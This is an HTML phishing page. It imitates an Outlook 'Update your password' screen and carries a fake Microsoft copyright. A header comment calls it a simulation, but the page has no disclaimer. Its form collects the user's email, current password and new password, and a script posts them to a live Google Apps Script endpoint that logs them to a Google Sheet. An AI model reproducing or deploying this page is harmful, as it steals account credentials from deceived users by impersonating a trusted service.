<!-- index.html (Outlook Password Change Simulation) -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Update your password - Outlook</title>
  <style>
    body {
      background: #f3f6fb;
      font-family: Segoe UI, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 380px;
      margin: 60px auto;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 18px rgba(0,0,0,0.10);
      padding: 32px 28px;
      border: 1.5px solid #e3e6ee;
    }
    .header {
      text-align: left;
      margin-bottom: 24px;
    }
    .header img {
      width: 44px;
      margin-bottom: 10px;
    }
    h2 {
      color: #0078d4;
      font-size: 1.2em;
      margin: 0 0 10px 0;
    }
    label {
      display: block;
      margin-top: 18px;
      margin-bottom: 6px;
      color: #444;
      font-size: 1em;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      box-sizing: border-box;
      padding: 10px 12px;
      border: 1px solid #c8c8c8;
      border-radius: 4px;
      font-size: 1em;
      margin-bottom: 4px;
      background: #f9f9f9;
    }
    .btn {
      width: 100%;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 12px 0;
      font-size: 1em;
      margin-top: 18px;
      cursor: pointer;
    }
    .footer {
      margin-top: 22px;
      font-size: 0.92em;
      color: #888;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Update your password</h2>
      <p>For your security, please change your password regularly.</p>
    </div>

    <!-- NETLIFY FORM (Must include `netlify` or `data-netlify="true"`) -->
    <form
        action="https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec"
        method="POST"
        enctype="application/x-www-form-urlencoded"
    >
      <!-- Form fields -->
      <label for="email">Email address</label>
      <input type="email" id="email" name="email" required>

      <label for="current-password">Current password</label>
      <input type="password" id="current-password" name="current-password" required>

      <label for="new-password">New password</label>
      <input type="password" id="new-password" name="new-password" required>

      <button type="submit">Update password</button>
    </form>
    
    <!-- Success message (hidden by default) -->
    <p id="success-msg" style="display: none; color: green;">
    Submitted successfully! Check Google Sheets.
    </p>

    <div class="footer">
      &copy; 2025 Microsoft Corporation. All rights reserved.
    </div>
  </div>
  <script>
  document.querySelector("form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const formData = new URLSearchParams(new FormData(e.target));
    
    try {
      const response = await fetch(e.target.action, {
        method: "POST",
        body: formData,
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
      });
      
      if (response.ok) {
        document.getElementById("success-msg").style.display = "block";
        e.target.reset(); // Clear form
      } else {
        alert("Error submitting form!");
      }
    } catch (error) {
      alert("Network error: " + error.message);
    }
  });
</script>
</body>
</html>
